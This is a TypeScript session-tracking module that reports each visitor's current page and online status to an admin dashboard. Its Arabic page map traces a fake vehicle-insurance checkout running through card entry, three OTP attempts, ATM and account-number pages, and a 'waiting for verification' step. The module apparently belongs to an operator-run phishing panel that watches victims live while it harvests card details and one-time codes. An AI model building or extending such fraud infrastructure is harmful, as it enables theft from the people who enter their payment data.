/**
 * Page Tracking Store
 * Tracks which page each session is currently viewing and their connection status
 */

export interface SessionInfo {
  sessionId: string;
  currentPage: string;
  isOnline: boolean;
  lastSeen: number;
  connectedAt: number;
}

// Store session info: sessionId -> SessionInfo
const sessionInfoMap = new Map<string, SessionInfo>();

// Store listeners for real-time updates
type UpdateCallback = (sessionId: string, info: SessionInfo | null) => void;
const listeners: Set<UpdateCallback> = new Set();

export function getPageArabic(page: string): string {
  const pageMap: Record<string, string> = {
    "/": "الصفحة الرئيسية",
    "/form": "بيانات المركبة",
    "/select": "اختيار الباقة",
    "/total": "ملخص التكلفة",
    "/total2": "تأكيد التكلفة",
    "/visa": "الدفع بالبطاقة",
    "/otp": "رمز التحقق",
    "/otp2": "رمز التحقق (محاولة 2)",
    "/otp3": "رمز التحقق (محاولة 3)",
    "/atm": "صراف ATM",
    "/nomer": "رقم الحساب",
    "/nomer-wait": "انتظار التحقق",
    "/nomer-otp": "رمز التحقق للحساب",
    "/identity-check": "التحقق من الهوية",
    "/waiting": "قائمة الانتظار",
    "/admin": "لوحة الإدارة",
    "/admin/dashboard": "لوحة التحكم",
  };
  return pageMap[page] || page;
}

// Update session's current page
export function updateSessionPage(sessionId: string, page: string): SessionInfo {
  let info = sessionInfoMap.get(sessionId);
  const now = Date.now();
  
  if (!info) {
    info = {
      sessionId,
      currentPage: page,
      isOnline: true,
      lastSeen: now,
      connectedAt: now,
    };
  } else {
    info.currentPage = page;
    info.lastSeen = now;
    info.isOnline = true;
  }
  
  sessionInfoMap.set(sessionId, info);
  
  // Notify all listeners
  listeners.forEach(callback => {
    try {
      callback(sessionId, info!);
    } catch (e) {
      console.error("[PageTracker] Listener error:", e);
    }
  });
  
  console.log(`[PageTracker] Session ${sessionId} navigated to ${page}`);
  return info;
}

// Mark session as offline (called when SSE connection closes)
export function setSessionOffline(sessionId: string): void {
  const info = sessionInfoMap.get(sessionId);
  if (info) {
    info.isOnline = false;
    info.lastSeen = Date.now();
    sessionInfoMap.set(sessionId, info);
    
    console.log(`[PageTracker] Session ${sessionId} went offline`);
    
    // Notify all listeners
    listeners.forEach(callback => {
      try {
        callback(sessionId, info);
      } catch (e) {
        console.error("[PageTracker] Listener error:", e);
      }
    });
  }
}

// Mark session as online (called when SSE connection opens)
export function setSessionOnline(sessionId: string): void {
  const info = sessionInfoMap.get(sessionId);
  if (info) {
    info.isOnline = true;
    info.lastSeen = Date.now();
    sessionInfoMap.set(sessionId, info);
    
    console.log(`[PageTracker] Session ${sessionId} came online`);
    
    listeners.forEach(callback => {
      try {
        callback(sessionId, info!);
      } catch (e) {
        console.error("[PageTracker] Listener error:", e);
      }
    });
  }
}

// Get all session info
export function getAllSessionInfo(): SessionInfo[] {
  return Array.from(sessionInfoMap.values());
}

// Get specific session info
export function getSessionInfo(sessionId: string): SessionInfo | undefined {
  return sessionInfoMap.get(sessionId);
}

// Subscribe to session updates
export function subscribe(callback: UpdateCallback): () => void {
  listeners.add(callback);
  return () => listeners.delete(callback);
}

// Cleanup stale sessions (sessions offline for more than 30 minutes)
export function cleanupStaleSessions(): void {
  const now = Date.now();
  const staleThreshold = 30 * 60 * 1000; // 30 minutes
  
  for (const [sessionId, info] of sessionInfoMap) {
    if (!info.isOnline && (now - info.lastSeen) > staleThreshold) {
      sessionInfoMap.delete(sessionId);
      console.log(`[PageTracker] Cleaned up stale session: ${sessionId}`);
    }
  }
}

// Run cleanup every 10 minutes
setInterval(cleanupStaleSessions, 10 * 60 * 1000);
